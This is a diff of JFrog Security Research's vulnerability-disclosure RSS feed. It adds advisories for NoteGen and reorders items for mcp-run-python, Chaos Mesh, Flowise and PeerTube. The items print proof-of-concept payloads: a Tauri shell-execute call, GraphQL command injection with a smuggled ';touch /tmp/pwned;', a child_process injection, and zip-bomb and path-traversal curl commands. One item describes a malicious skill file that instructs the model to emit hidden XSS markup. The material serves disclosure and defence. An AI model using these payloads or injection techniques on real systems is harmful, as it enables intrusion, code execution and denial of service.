@@ -4,7 +4,7 @@
         <title>JFrog Security Vulnerabilities</title>
         <link>https://research.jfrog.com/</link>
         <description>Latest vulnerability disclosures discovered by JFrog Security Research.</description>
-        <lastBuildDate>Tue, 28 Jul 2026 15:33:08 GMT</lastBuildDate>
+        <lastBuildDate>Tue, 28 Jul 2026 15:38:51 GMT</lastBuildDate>
         <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
         <generator>Gridsome Feed Plugin</generator>
         <language>en</language>
@@ -84,6 +84,155 @@ https://github.com/MoonshotAI/kimi-code/pull/1791
 https://github.com/MoonshotAI/kimi-code/commit/31449728b72df94e22bcb2de350a1e7624895e30
 https://github.com/MoonshotAI/kimi-code/releases/tag/%40moonshot-ai%2Fkimi-code%400.27.0
 
+]]></content:encoded>
+        </item>
+        <item>
+            <title><![CDATA[NoteGen is vulnerable to Arbitrary OS Command Execution via Tauri shell:allow-execute for bash/python]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/notegen-is-vulnerable-to-arbitrary-os-command-execution-via-tauri-shell-allow-execute-cve-2026-17497/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/notegen-is-vulnerable-to-arbitrary-os-command-execution-via-tauri-shell-allow-execute-cve-2026-17497/</guid>
+            <pubDate>Sun, 26 Jul 2026 00:00:00 GMT</pubDate>
+            <description><![CDATA[CVE-2026-17497, HIGH, NoteGen is vulnerable to Arbitrary OS Command Execution via Tauri shell:allow-execute for bash/python]]></description>
+            <content:encoded><![CDATA[
+## Summary
+
+NoteGen is vulnerable to Arbitrary OS Command Execution via Tauri shell:allow-execute for bash/python
+
+
+## Component
+
+note-gen (NoteGen)
+
+## Affected versions
+
+< 0.32.0
+
+## Description
+
+NoteGen before 0.32.0 grants the Tauri shell plugin shell:allow-execute capability for bash, python, and python3 with arbitrary arguments in the default desktop capabilities. JavaScript running in the application webview can therefore invoke plugin:shell|execute to run attacker-controlled operating system commands with the privileges of the NoteGen process. In combination with script execution in the webview, for example via chat XSS (CVE-2026-17496), this enables full remote code execution on the user's machine.
+
+## PoC
+
+<br>
+
+**Step 1 - Obtain JavaScript execution in the NoteGen webview**
+
+<br>
+
+Use chat XSS (CVE-2026-17496) or another webview script sink so attacker JavaScript runs inside NoteGen < 0.32.0 on a default installation.
+
+<br>
+
+**Step 2 - Invoke the Tauri shell execute API**
+
+<br>
+
+From the webview, call:
+
+```javascript
+window.__TAURI__.core.invoke('plugin:shell|execute', {
+  program: 'bash',
+  args: ['-c', 'open -a Calculator'],
+  options: { cwd: null, env: null, encoding: 'utf-8' }
+});
+```
+
+<br>
+
+**Step 3 - Verify OS command execution**
+
+<br>
+
+Expected result: Calculator opens as the NoteGen user, proving arbitrary OS command execution via bash -c. The same path can read local files and exfiltrate them to an attacker-controlled server.
+
+## Vulnerability Mitigations
+
+Upgrade to NoteGen 0.32.0 or later. The fix removes shell:allow-execute entries that permitted bash, python, and python3 with attacker-controlled arguments from the default Tauri capabilities, closing the webview-to-OS command execution path.
+
+## References
+https://github.com/advisories/GHSA-r5ff-hq22-rhgv
+https://github.com/codexu/note-gen/commit/00064a4a8ec4177d51094ffb3e15bf0758009c1f
+https://github.com/codexu/note-gen/releases/tag/note-gen-v0.32.0
+]]></content:encoded>
+        </item>
+        <item>
+            <title><![CDATA[NoteGen is vulnerable to Chat Preview XSS via Unsanitized AI/Skill HTML Rendering]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/notegen-is-vulnerable-to-chat-preview-xss-via-unsanitized-ai-skill-html-rendering-cve-2026-17496/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/notegen-is-vulnerable-to-chat-preview-xss-via-unsanitized-ai-skill-html-rendering-cve-2026-17496/</guid>
+            <pubDate>Sun, 26 Jul 2026 00:00:00 GMT</pubDate>
+            <description><![CDATA[CVE-2026-17496, CRITICAL, NoteGen is vulnerable to Chat Preview XSS via Unsanitized AI/Skill HTML Rendering]]></description>
+            <content:encoded><![CDATA[
+## Summary
+
+NoteGen is vulnerable to Chat Preview XSS via Unsanitized AI/Skill HTML Rendering
+
+
+## Component
+
+note-gen (NoteGen)
+
+## Affected versions
+
+< 0.32.0
+
+## Description
+
+NoteGen before 0.32.0 renders AI chat responses with markdown-it configured with html:true and injects the result into the DOM via dangerouslySetInnerHTML in chat-preview, without HTML sanitization and with CSP set to null. Attacker-controlled content that reaches the model prompt, for example a malicious skill REFERENCE.md that instructs the model to emit HTML, can cause the model response to include executable markup such as an img onerror handler. When the user views the chat response, that markup runs as JavaScript in the privileged Tauri webview, enabling arbitrary script execution in the application context.
+
+## PoC
+
+<br>
+
+**Step 1 - Install a malicious skill**
+
+<br>
+
+Copy a skill whose REFERENCE.md instructs the model to wrap responses in an HTML container that includes a hidden img onerror payload into the NoteGen skills directory, for example:
+
+```cp -r writing-assistant ~/Library/Application\ Support/com.codexu.NoteGen/skills/```
+
+<br>
+
+A minimal REFERENCE.md payload shape:
+
+```html
+<div class="wa-response">
+[content]
+<img src="wa-1.2.0" onerror="alert(1)" style="display:none" alt="">
+</div>
+```
+
+<br>
+
+**Step 2 - Launch NoteGen and open chat**
+
+<br>
+
+Use a clean default installation of NoteGen < 0.32.0 with an AI model configured. Confirm the skill appears in the skills list.
+
+<br>
+
+**Step 3 - Trigger the skill in chat**
+
+<br>
+
+Start a new chat and ask the model to use the skill, for example: "use the writing-assistant skill to write me a project delay email".
+
+<br>
+
+**Step 4 - Verify script execution in the webview**
+
+<br>
+
+When the model response is rendered in chat-preview, the img onerror handler runs in the NoteGen Tauri webview. Expected proof: the alert (or other chosen JavaScript side effect) fires while the user only sees a normal-looking chat reply.
+
+## Vulnerability Mitigations
+
+Upgrade to NoteGen 0.32.0 or later. The fix replaces unsanitized markdown-it HTML injection in chat preview with Streamdown-based rendering that hardens and sanitizes untrusted HTML in model output.
+
+## References
+https://github.com/advisories/GHSA-gwhc-vprp-gfcg
+https://github.com/codexu/note-gen/commit/ae3ba948c41d8a74b4a20f4c6f26fcdda2002298
+https://github.com/codexu/note-gen/releases/tag/note-gen-v0.32.0
 ]]></content:encoded>
         </item>
         <item>
@@ -212,76 +361,6 @@ https://github.com/pollen-robotics/reachy-mini-os/security/advisories/GHSA-7rhg-
 ]]></content:encoded>
         </item>
         <item>
-            <title><![CDATA[mcp-run-python Deno SSRF]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/mcp-run-python-deno-ssrf-jfsa-2026-001653029/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/mcp-run-python-deno-ssrf-jfsa-2026-001653029/</guid>
-            <pubDate>Mon, 09 Feb 2026 00:00:00 GMT</pubDate>
-            <description><![CDATA[CVE-2026-25904, MEDIUM, Overly permissive Deno configuration in mcp-run-python leads to SSRF]]></description>
-            <content:encoded><![CDATA[
-## Summary
-
-Overly permissive Deno configuration in mcp-run-python leads to SSRF
-
-## Component
-
-mcp-run-python
-
-## Affected versions
-
-(,)
-
-## Description
-
-The Pydantic-AI MCP Run Python tool configures the Deno sandbox with an overly permissive configuration that allows the underlying Python code to access the localhost interface of the host to perform SSRF attacks. Note - the "mcp-run-python" project is archived and unlikely to receive a fix.
-
-## PoC
-
-1. Configure Claude-Desktop or any other MCP Client to use the Pydantic-AI MCP Run Python tool:
-
-   ```json
-   {
-   "mcpServers": {
-   "mcp-run-python":{
-           "command": "uvx",
-           "args": [
-           "mcp-run-python",
-           "stdio"
-           ]
-       }
-     }
-   }
-   ```
-
-2. Start a HTTP server listening to the localhost interface:
-
-   ```bash
-   python3 -m http.server -b 127.0.0.1 1234
-   ```
-
-3. Ask the MCP client to run this PoC code:
-
-   ```python
-   from pyodide.http import pyfetch
-   response = await pyfetch("http://localhost:1234")
-   data = await response.text()
-   print(data)
-   ```
-
-4. View that the localhost server got a request from the tool
-
-
-
-## Vulnerability Mitigations
-
-No mitigations are supplied for this issue
-
-## References
-
-
-
-]]></content:encoded>
-        </item>
-        <item>
             <title><![CDATA[mcp-run-python lack of isolation MCP takeover]]></title>
             <link>https://research.jfrog.com/vulnerabilities/mcp-run-python-lack-of-isolation-mcp-takeover-jfsa-2026-001653030/</link>
             <guid>https://research.jfrog.com/vulnerabilities/mcp-run-python-lack-of-isolation-mcp-takeover-jfsa-2026-001653030/</guid>
@@ -368,6 +447,76 @@ js.JSON.stringify = js_func
 9. The tool will seem stuck, Note the new notifications/tools/list\_changed notification from the server
 10. Click on `Clear` and then `List Tools`  
 11. Note that the tool name changed from `run_python_code` to `Hijacked Tool`
+
+
+
+## Vulnerability Mitigations
+
+No mitigations are supplied for this issue
+
+## References
+
+
+
+]]></content:encoded>
+        </item>
+        <item>
+            <title><![CDATA[mcp-run-python Deno SSRF]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/mcp-run-python-deno-ssrf-jfsa-2026-001653029/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/mcp-run-python-deno-ssrf-jfsa-2026-001653029/</guid>
+            <pubDate>Mon, 09 Feb 2026 00:00:00 GMT</pubDate>
+            <description><![CDATA[CVE-2026-25904, MEDIUM, Overly permissive Deno configuration in mcp-run-python leads to SSRF]]></description>
+            <content:encoded><![CDATA[
+## Summary
+
+Overly permissive Deno configuration in mcp-run-python leads to SSRF
+
+## Component
+
+mcp-run-python
+
+## Affected versions
+
+(,)
+
+## Description
+
+The Pydantic-AI MCP Run Python tool configures the Deno sandbox with an overly permissive configuration that allows the underlying Python code to access the localhost interface of the host to perform SSRF attacks. Note - the "mcp-run-python" project is archived and unlikely to receive a fix.
+
+## PoC
+
+1. Configure Claude-Desktop or any other MCP Client to use the Pydantic-AI MCP Run Python tool:
+
+   ```json
+   {
+   "mcpServers": {
+   "mcp-run-python":{
+           "command": "uvx",
+           "args": [
+           "mcp-run-python",
+           "stdio"
+           ]
+       }
+     }
+   }
+   ```
+
+2. Start a HTTP server listening to the localhost interface:
+
+   ```bash
+   python3 -m http.server -b 127.0.0.1 1234
+   ```
+
+3. Ask the MCP client to run this PoC code:
+
+   ```python
+   from pyodide.http import pyfetch
+   response = await pyfetch("http://localhost:1234")
+   data = await response.text()
+   print(data)
+   ```
+
+4. View that the localhost server got a request from the tool
 
 
 
@@ -1177,61 +1326,6 @@ No mitigations are supplied for this issue
 ]]></content:encoded>
         </item>
         <item>
-            <title><![CDATA[Chaos Mesh cleanIptables command injection]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/chaos-mesh-command-injection-cleaniptables-jfsa-2025-001449536/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/chaos-mesh-command-injection-cleaniptables-jfsa-2025-001449536/</guid>
-            <pubDate>Mon, 15 Sep 2025 00:00:00 GMT</pubDate>
-            <description><![CDATA[CVE-2025-59361, CRITICAL, OS command injection in Chaos Mesh via the cleanIptables mutation]]></description>
-            <content:encoded><![CDATA[
-## Summary
-
-OS command injection in Chaos Mesh via the cleanIptables mutation
-
-## Component
-
-github.com/chaos-mesh/chaos-mesh
-
-## Affected versions
-
-(,2.7.2]
-
-## Description
-
-The cleanIptables mutation in Chaos Controller Manager is vulnerable to OS command injection. In conjunction with CVE-2025-59358, this allows unauthenticated in-cluster attackers to perform remote code execution across the cluster.
-
-
-## PoC
-
-```shell
-curl -X POST -H "Content-Type: application/json" -d /
-'{"query": "mutation CleanIptablesInPod { 
-pod(ns: \"chaos-mesh\", name: \"chaos-dashboard-5c6575bd9f-b5tqg\") {
- cleanIptables(chains: [\"INPUT;touch /tmp/pwned; \", \"OUTPUT\", \"FORWARD\", \"CHAOS-MESH-INPUT\", \"CHAOS-MESH-OUTPUT\"])
- }
- }"}' http://controller-manager-host:10082/query
-```
-
-
-
-## Vulnerability Mitigations
-
-If upgrading Chaos-Mesh to the fixed version is not possible, re-deploy the Helm chart and disable the **chaosctl** tool and port:
-
-```shell
-helm install chaos-mesh chaos-mesh/chaos-mesh -n=chaos-mesh --version 2.7.x --set enableCtrlServer=false
-```
-
-
-
-## References
-
-[Fix PR](https://github.com/chaos-mesh/chaos-mesh/pull/4702)
-
-[JFrog Technical Blog](https://jfrog.com/blog/chaotic-deputy-critical-vulnerabilities-in-chaos-mesh-lead-to-kubernetes-cluster-takeover)
-
-]]></content:encoded>
-        </item>
-        <item>
             <title><![CDATA[Chaos Mesh cleanTcs command injection]]></title>
             <link>https://research.jfrog.com/vulnerabilities/chaos-mesh-command-injection-clean-tcs-jfsa-2025-001449534/</link>
             <guid>https://research.jfrog.com/vulnerabilities/chaos-mesh-command-injection-clean-tcs-jfsa-2025-001449534/</guid>
@@ -1287,15 +1381,15 @@ helm install chaos-mesh chaos-mesh/chaos-mesh -n=chaos-mesh --version 2.7.x --se
 ]]></content:encoded>
         </item>
         <item>
-            <title><![CDATA[Chaos Mesh killProcesses command injection]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/chaos-mesh-command-injection-killprocesses-jfsa-2025-001449535/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/chaos-mesh-command-injection-killprocesses-jfsa-2025-001449535/</guid>
+            <title><![CDATA[Chaos Mesh cleanIptables command injection]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/chaos-mesh-command-injection-cleaniptables-jfsa-2025-001449536/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/chaos-mesh-command-injection-cleaniptables-jfsa-2025-001449536/</guid>
             <pubDate>Mon, 15 Sep 2025 00:00:00 GMT</pubDate>
-            <description><![CDATA[CVE-2025-59360, CRITICAL, OS command injection in Chaos Mesh via the killProcesses mutation]]></description>
+            <description><![CDATA[CVE-2025-59361, CRITICAL, OS command injection in Chaos Mesh via the cleanIptables mutation]]></description>
             <content:encoded><![CDATA[
 ## Summary
 
-OS command injection in Chaos Mesh via the killProcesses mutation
+OS command injection in Chaos Mesh via the cleanIptables mutation
 
 ## Component
 
@@ -1307,16 +1401,18 @@ github.com/chaos-mesh/chaos-mesh
 
 ## Description
 
-The killProcesses mutation in Chaos Controller Manager is vulnerable to OS command injection. In conjunction with CVE-2025-59358, this allows unauthenticated in-cluster attackers to perform remote code execution across the cluster.
+The cleanIptables mutation in Chaos Controller Manager is vulnerable to OS command injection. In conjunction with CVE-2025-59358, this allows unauthenticated in-cluster attackers to perform remote code execution across the cluster.
 
 
 ## PoC
 
 ```shell
-{"query": "mutation KillProcessesInPod { 
-pod(ns: \"kube-system\", name: \"kube-proxy-9trk4\") { 
-killProcesses(pids: [\"1\","; touch /tmp/pwned;"]) { 
-pid command } } }
+curl -X POST -H "Content-Type: application/json" -d /
+'{"query": "mutation CleanIptablesInPod { 
+pod(ns: \"chaos-mesh\", name: \"chaos-dashboard-5c6575bd9f-b5tqg\") {
+ cleanIptables(chains: [\"INPUT;touch /tmp/pwned; \", \"OUTPUT\", \"FORWARD\", \"CHAOS-MESH-INPUT\", \"CHAOS-MESH-OUTPUT\"])
+ }
+ }"}' http://controller-manager-host:10082/query
 ```
 
 
@@ -1389,6 +1485,59 @@ helm install chaos-mesh chaos-mesh/chaos-mesh -n=chaos-mesh --version 2.7.x --se
 [JFrog Technical Blog](https://jfrog.com/blog/chaotic-deputy-critical-vulnerabilities-in-chaos-mesh-lead-to-kubernetes-cluster-takeover)
 
 
+
+]]></content:encoded>
+        </item>
+        <item>
+            <title><![CDATA[Chaos Mesh killProcesses command injection]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/chaos-mesh-command-injection-killprocesses-jfsa-2025-001449535/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/chaos-mesh-command-injection-killprocesses-jfsa-2025-001449535/</guid>
+            <pubDate>Mon, 15 Sep 2025 00:00:00 GMT</pubDate>
+            <description><![CDATA[CVE-2025-59360, CRITICAL, OS command injection in Chaos Mesh via the killProcesses mutation]]></description>
+            <content:encoded><![CDATA[
+## Summary
+
+OS command injection in Chaos Mesh via the killProcesses mutation
+
+## Component
+
+github.com/chaos-mesh/chaos-mesh
+
+## Affected versions
+
+(,2.7.2]
+
+## Description
+
+The killProcesses mutation in Chaos Controller Manager is vulnerable to OS command injection. In conjunction with CVE-2025-59358, this allows unauthenticated in-cluster attackers to perform remote code execution across the cluster.
+
+
+## PoC
+
+```shell
+{"query": "mutation KillProcessesInPod { 
+pod(ns: \"kube-system\", name: \"kube-proxy-9trk4\") { 
+killProcesses(pids: [\"1\","; touch /tmp/pwned;"]) { 
+pid command } } }
+```
+
+
+
+## Vulnerability Mitigations
+
+If upgrading Chaos-Mesh to the fixed version is not possible, re-deploy the Helm chart and disable the **chaosctl** tool and port:
+
+```shell
+helm install chaos-mesh chaos-mesh/chaos-mesh -n=chaos-mesh --version 2.7.x --set enableCtrlServer=false
+```
+
+
+
+## References
+
+[Fix PR](https://github.com/chaos-mesh/chaos-mesh/pull/4702)
+
+[JFrog Technical Blog](https://jfrog.com/blog/chaotic-deputy-critical-vulnerabilities-in-chaos-mesh-lead-to-kubernetes-cluster-takeover)
 
 ]]></content:encoded>
         </item>
@@ -1594,6 +1743,60 @@ additional_authorized_imports=[],executor_type='wasm')
 ]]></content:encoded>
         </item>
         <item>
+            <title><![CDATA[Flowise JS injection remote code execution]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/flowise-js-injection-remote-code-exection-jfsa-2025-001379925/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/flowise-js-injection-remote-code-exection-jfsa-2025-001379925/</guid>
+            <pubDate>Thu, 14 Aug 2025 00:00:00 GMT</pubDate>
+            <description><![CDATA[CVE-2025-55346, CRITICAL, Flowise JS injection remote code execution]]></description>
+            <content:encoded><![CDATA[
+## Summary
+
+Unintended dynamic code execution leads to remote code execution by network attackers
+
+## Component
+
+[flowise](https://www.npmjs.com/package/flowise?activeTab=code)
+
+## Affected versions
+
+(,)
+
+## Description
+
+User-controlled input flows to an unsafe implementation of a dynamic Function constructor, allowing network attackers to run arbitrary unsandboxed JS code in the context of the host, by sending a simple POST request. Depending on the version of Flowise this could lead to either unauthenticated or authenticated remote code execution.
+
+
+## PoC
+
+Send the following payload to the `node-load-method/customMCP` API endpoint -
+
+```json
+{
+    "inputs":
+    {
+        "mcpServerConfig": "(global.process.mainModule.require('child_process').execSync('touch /tmp/foo'))"
+    },
+    "loadMethod": "listActions"
+}
+```
+
+
+
+
+
+## Vulnerability Mitigations
+
+No mitigations are supplied for this issue
+
+
+
+## References
+
+
+
+]]></content:encoded>
+        </item>
+        <item>
             <title><![CDATA[Flowise OS command remote code execution]]></title>
             <link>https://research.jfrog.com/vulnerabilities/flowise-os-command-remote-code-execution-jfsa-2025-001380578/</link>
             <guid>https://research.jfrog.com/vulnerabilities/flowise-os-command-remote-code-execution-jfsa-2025-001380578/</guid>
@@ -1642,60 +1845,6 @@ Send the following payload to the `node-load-method/customMCP` API endpoint -
 ## Vulnerability Mitigations
 
 No mitigations are supplied for this issue
-
-## References
-
-
-
-]]></content:encoded>
-        </item>
-        <item>
-            <title><![CDATA[Flowise JS injection remote code execution]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/flowise-js-injection-remote-code-exection-jfsa-2025-001379925/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/flowise-js-injection-remote-code-exection-jfsa-2025-001379925/</guid>
-            <pubDate>Thu, 14 Aug 2025 00:00:00 GMT</pubDate>
-            <description><![CDATA[CVE-2025-55346, CRITICAL, Flowise JS injection remote code execution]]></description>
-            <content:encoded><![CDATA[
-## Summary
-
-Unintended dynamic code execution leads to remote code execution by network attackers
-
-## Component
-
-[flowise](https://www.npmjs.com/package/flowise?activeTab=code)
-
-## Affected versions
-
-(,)
-
-## Description
-
-User-controlled input flows to an unsafe implementation of a dynamic Function constructor, allowing network attackers to run arbitrary unsandboxed JS code in the context of the host, by sending a simple POST request. Depending on the version of Flowise this could lead to either unauthenticated or authenticated remote code execution.
-
-
-## PoC
-
-Send the following payload to the `node-load-method/customMCP` API endpoint -
-
-```json
-{
-    "inputs":
-    {
-        "mcpServerConfig": "(global.process.mainModule.require('child_process').execSync('touch /tmp/foo'))"
-    },
-    "loadMethod": "listActions"
-}
-```
-
-
-
-
-
-## Vulnerability Mitigations
-
-No mitigations are supplied for this issue
-
-
 
 ## References
 
@@ -2360,64 +2509,6 @@ No mitigations are supplied for this issue
 ]]></content:encoded>
         </item>
         <item>
-            <title><![CDATA[PeerTube User Import Authenticated Resource Exhaustion]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/peertube-archive-resource-exhaustion/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/peertube-archive-resource-exhaustion/</guid>
-            <pubDate>Mon, 14 Apr 2025 00:00:00 GMT</pubDate>
-            <description><![CDATA[CVE-2025-32949 Medium severity. PeerTube User Import Authenticated Resource Exhaustion]]></description>
-            <content:encoded><![CDATA[## Summary
-This vulnerability allows any authenticated user to cause the server to consume very large amounts of disk space when extracting a Zip Bomb
-
-
-
-## Component
-
-[PeerTube](https://github.com/Chocobozzz/PeerTube)
-
-
-
-## Affected versions
-
-(, 7.1.0]
-
-
-
-## Description
-
-If user import is enabled (which is the default setting), any registered user can upload an archive for importing. The code uses the yauzl library for reading the archive.
-The yauzl library does not contain any mechanism to detect or prevent extraction of a [Zip Bomb](https://en.wikipedia.org/wiki/Zip_bomb). Therefore, when using the User Import functionality with a Zip Bomb, PeerTube will try extracting the archive which will cause a disk space resource exhaustion.
-
-## PoC
-
-This PoC assumes that there is a PeerTube instance on the machine listening on ports 3000 (client) and 9000 (server). Note that running this PoC will cause PeerTube’s server to shut down.
-
-
-
-1. First, using a browser, log in to the PeerTube instance with any user’s credentials, and use the inspection screen to copy the authorization token of the user.
-1. Create a Zip Bomb named `evil.zip` in the current directory
-1. In a terminal, run the following commands (replace “user_token” with the token obtained from step #1):
-```
-new_location=http:$(curl -s -D - 'http://127.0.0.1:3000/api/v1/users/1/imports/import-resumable' -H 'Authorization: Bearer user_token' -H 'Content-Type: application/json; charset=UTF-8' -H 'X-Upload-Content-Length: 168' -H 'X-Upload-Content-Type: application/x-zip-compressed' --data-raw '{"name":"evil.zip","mimeType":"application/x-zip-compressed","size":168,"lastModified":1743493990068,"filename":"evil.zip"}' | awk '/^location:/{print $2}' | tr -d '\r')
-curl -X PUT "$new_location" -H "Content-Type: application/octet-stream" -H "Content-Range: bytes 0-167/168" -H 'Authorization: user_token' --data-binary @evil.zip
-```
-If everything was done correctly, the PeerTube server will begin extracting the zip file, which will cause disk space resource exhaustion.
-
-
-
-## Vulnerability Mitigations
-
-No mitigations are supplied for this issue
-
-
-
-## References
-
-[Fix release](https://github.com/Chocobozzz/PeerTube/releases/tag/v7.1.1)
-
-[PoC Materials](https://drive.google.com/file/d/1zmXFNutT4ACOJZGmxhU22nhu9Fbn4ui2/view?usp=drive_link)
-]]></content:encoded>
-        </item>
-        <item>
             <title><![CDATA[PeerTube User Import Authenticated Persistent Denial of Service]]></title>
             <link>https://research.jfrog.com/vulnerabilities/peertube-archive-persistent-dos/</link>
             <guid>https://research.jfrog.com/vulnerabilities/peertube-archive-persistent-dos/</guid>
@@ -2461,62 +2552,6 @@ new_location=http:$(curl -s -D - 'http://127.0.0.1:3000/api/v1/users/1/imports/i
 curl -X PUT "$new_location" -H "Content-Type: application/octet-stream" -H "Content-Range: bytes 0-167/168" -H 'Authorization: user_token' --data-binary @evil.zip
 ```
 If everything was done correctly, the PeerTube server will crash, and will keep crashing as long as the ZIP file is not deleted from the system.
-
-
-
-## Vulnerability Mitigations
-
-No mitigations are supplied for this issue
-
-
-
-## References
-
-[Fix release](https://github.com/Chocobozzz/PeerTube/releases/tag/v7.1.1)
-
-[PoC Materials](https://drive.google.com/file/d/1zmXFNutT4ACOJZGmxhU22nhu9Fbn4ui2/view?usp=drive_link)
-]]></content:encoded>
-        </item>
-        <item>
-            <title><![CDATA[PeerTube HLS Video Files Path Traversal]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/peertube-hls-path-traversal/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/peertube-hls-path-traversal/</guid>
-            <pubDate>Mon, 14 Apr 2025 00:00:00 GMT</pubDate>
-            <description><![CDATA[CVE-2025-32943 Low severity. A Path Traversal allows any authenticated user to leak the contents of arbitrary .m3u8 files from the server]]></description>
-            <content:encoded><![CDATA[## Summary
-This vulnerability allows any authenticated user to leak the contents of arbitrary “.m3u8” files from the server.
-
-
-
-## Component
-
-[PeerTube](https://github.com/Chocobozzz/PeerTube)
-
-
-
-## Affected versions
-
-(, 7.1.0]
-
-
-
-## Description
-
-One of PeerTube’s API endpoints is `/static/streaming-playlists/hls/private/:videoUUID/:playlistName.m3u8`. This endpoint is used to fetch a `.m3u8` file of a private video. The code first checks that a valid video token was sent, and then sends the file contents. PeerTube does not sanitize the `playlistName` argument correctly. Instead of sanitizing the `playlistName` argument from `req.param`, [it tries to sanitize an optional playlistName argument from the query string](https://github.com/Chocobozzz/PeerTube/blob/f0f44e1704db1187ed267ced69cec414974275f5/server/core/middlewares/validators/static.ts#L74). An attacker can use the UUID of a public video, and insert `..%2f` in the `playlistName` field to traverse out of the video’s directory and into any other directory in the system and receive any `.m3u8` file. Reading a meaningful file might be difficult since there is a need to know the exact path of the specific `.m3u8` file wanted.
-
-## PoC
-
-This PoC assumes that there is a PeerTube instance on the machine listening on ports 3000 (client) and 9000 (server). Note that running this PoC will cause PeerTube’s server to shut down.
-
-1. First, using a browser, log in to the PeerTube instance with any user’s credentials.
-1. Upload a video to the server and make it private. Browse to the new uploaded video, and use the inspection screen to find and copy the video’s playlist UUID and .m3u8 filename. Save this information.
-1. Upload another video and make it public. Use the inspection screen to find and copy the video’s UUID.
-1. In a terminal, run the following commands (replace “public_uuid” with the UUID of the public video, “private_uuid” with the UUID of the private video, and “private_m3u8_file.m3u8” with the .m3u8 filename, all from step #1):
-
-```
-curl --path-as-is http://localhost:3000/static/streaming-playlists/hls/private/public_uuid/..%2fprivate_uuid%2fprivate_m3u8_file.m3u8 -H "x-peertube-video-password: 123"
-```
-The .m3u8 file will be returned.
 
 
 
@@ -2606,6 +2641,120 @@ This PoC assumes that there is a PeerTube instance on the machine listening on p
    This script will create, sign and send a Create Activity to **http://localhost:9000/inbox**.
 
 1. If everything was configured correctly, a new playlist will be created in **root_channel**, containing one video, and with a picture of a cat as the playlist’s thumbnail.
+
+## Vulnerability Mitigations
+
+No mitigations are supplied for this issue
+
+
+
+## References
+
+[Fix release](https://github.com/Chocobozzz/PeerTube/releases/tag/v7.1.1)
+
+[PoC Materials](https://drive.google.com/file/d/1zmXFNutT4ACOJZGmxhU22nhu9Fbn4ui2/view?usp=drive_link)
+]]></content:encoded>
+        </item>
+        <item>
+            <title><![CDATA[PeerTube User Import Authenticated Resource Exhaustion]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/peertube-archive-resource-exhaustion/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/peertube-archive-resource-exhaustion/</guid>
+            <pubDate>Mon, 14 Apr 2025 00:00:00 GMT</pubDate>
+            <description><![CDATA[CVE-2025-32949 Medium severity. PeerTube User Import Authenticated Resource Exhaustion]]></description>
+            <content:encoded><![CDATA[## Summary
+This vulnerability allows any authenticated user to cause the server to consume very large amounts of disk space when extracting a Zip Bomb
+
+
+
+## Component
+
+[PeerTube](https://github.com/Chocobozzz/PeerTube)
+
+
+
+## Affected versions
+
+(, 7.1.0]
+
+
+
+## Description
+
+If user import is enabled (which is the default setting), any registered user can upload an archive for importing. The code uses the yauzl library for reading the archive.
+The yauzl library does not contain any mechanism to detect or prevent extraction of a [Zip Bomb](https://en.wikipedia.org/wiki/Zip_bomb). Therefore, when using the User Import functionality with a Zip Bomb, PeerTube will try extracting the archive which will cause a disk space resource exhaustion.
+
+## PoC
+
+This PoC assumes that there is a PeerTube instance on the machine listening on ports 3000 (client) and 9000 (server). Note that running this PoC will cause PeerTube’s server to shut down.
+
+
+
+1. First, using a browser, log in to the PeerTube instance with any user’s credentials, and use the inspection screen to copy the authorization token of the user.
+1. Create a Zip Bomb named `evil.zip` in the current directory
+1. In a terminal, run the following commands (replace “user_token” with the token obtained from step #1):
+```
+new_location=http:$(curl -s -D - 'http://127.0.0.1:3000/api/v1/users/1/imports/import-resumable' -H 'Authorization: Bearer user_token' -H 'Content-Type: application/json; charset=UTF-8' -H 'X-Upload-Content-Length: 168' -H 'X-Upload-Content-Type: application/x-zip-compressed' --data-raw '{"name":"evil.zip","mimeType":"application/x-zip-compressed","size":168,"lastModified":1743493990068,"filename":"evil.zip"}' | awk '/^location:/{print $2}' | tr -d '\r')
+curl -X PUT "$new_location" -H "Content-Type: application/octet-stream" -H "Content-Range: bytes 0-167/168" -H 'Authorization: user_token' --data-binary @evil.zip
+```
+If everything was done correctly, the PeerTube server will begin extracting the zip file, which will cause disk space resource exhaustion.
+
+
+
+## Vulnerability Mitigations
+
+No mitigations are supplied for this issue
+
+
+
+## References
+
+[Fix release](https://github.com/Chocobozzz/PeerTube/releases/tag/v7.1.1)
+
+[PoC Materials](https://drive.google.com/file/d/1zmXFNutT4ACOJZGmxhU22nhu9Fbn4ui2/view?usp=drive_link)
+]]></content:encoded>
+        </item>
+        <item>
+            <title><![CDATA[PeerTube HLS Video Files Path Traversal]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/peertube-hls-path-traversal/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/peertube-hls-path-traversal/</guid>
+            <pubDate>Mon, 14 Apr 2025 00:00:00 GMT</pubDate>
+            <description><![CDATA[CVE-2025-32943 Low severity. A Path Traversal allows any authenticated user to leak the contents of arbitrary .m3u8 files from the server]]></description>
+            <content:encoded><![CDATA[## Summary
+This vulnerability allows any authenticated user to leak the contents of arbitrary “.m3u8” files from the server.
+
+
+
+## Component
+
+[PeerTube](https://github.com/Chocobozzz/PeerTube)
+
+
+
+## Affected versions
+
+(, 7.1.0]
+
+
+
+## Description
+
